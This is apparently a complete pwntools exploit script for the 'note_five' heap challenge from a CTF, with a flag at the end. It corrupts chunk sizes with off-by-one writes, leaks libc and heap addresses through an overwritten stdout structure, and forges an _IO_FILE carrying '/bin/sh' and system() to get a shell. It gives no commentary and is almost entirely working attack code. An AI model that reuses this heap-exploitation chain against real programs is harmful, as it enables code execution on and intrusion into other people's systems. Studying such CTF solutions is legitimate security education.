from pwn import *
def cmd(c):
    p.sendlineafter(">> ",str(c))
def add(idx,size):
    cmd(1)
    p.sendlineafter(": ",str(idx))
    p.sendlineafter(": ",str(size))
def free(idx):
    cmd(3)
    p.sendlineafter(": ",str(idx))
def edit(idx,c):
    cmd(2)
    p.sendlineafter(": ",str(idx))
    p.sendafter(": ",c)
#
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc=ELF("./libc.so")
p=process('./note_five')
#p=remote("112.126.103.195",9999)
context.log_level='debug'
nop=0x3f8
add(0,nop)
add(1,0x98)
add(2,0x98)
add(3,0x98)
add(4,0x98)
edit(0,'A'*nop+'\xf1')
edit(1,"A"*0x98+'\xa1')
edit(2,p64(0x21)*18+'\x21'+'\n')
free(1)
add(1,0xe8)

add(0,0x98)
edit(4,'\x00'*0x98+'\xf1')
add(4,0x300)
edit(4,p64(0x21)*61+'\x21'+'\n')
free(0)
add(0,0xe8)
edit(0,'\x00'*0x98+p64(0xf1)+'\n')

free(2)
edit(1,'\x00'*0x98+p64(0xa1)+p64(0)+'\xe8\x37\n')
add(3,0x98)

free(4)
edit(0,'\x00'*0x98+p64(0xf1)+'\xcf\x25'+'\n')
add(0,0xe8)
add(0,0xe8)
edit(0,'\x00'*0x41+p64(0x1800)+'\x00'*0x19+'\n')
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x7ffff7a0d000)
libc.address=base
#gdb.attach(p,'')
AAA=0x7ffff7dd3f58-0x7ffff7a0d000+base
edit(0,'\x00'*0x41+p64(0x1800)+'\x00'*0x18+p64(AAA)+p64(AAA+8)+'\n')
#edit(0,'\x00'*0x41+p64(0x1800)+'\x00'*0x19+'\n')
heap=u64(p.read(8))

log.warning(hex(heap))
log.warning(hex(base))

fio=0x0000555555757410-0x555555778000+heap
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])

edit(1,fake+'\n')
edit(0,'\x00'*0x41+p64(0x1800)+p64(0x7ffff7dd26a3-0x7ffff7a0d000+base)*8+p64(0)*4+p64(fio)+'\n')



cmd(4)
p.interactive('n132>')
#bytectf{3c0a56db0867194e6157834f8fd76848}

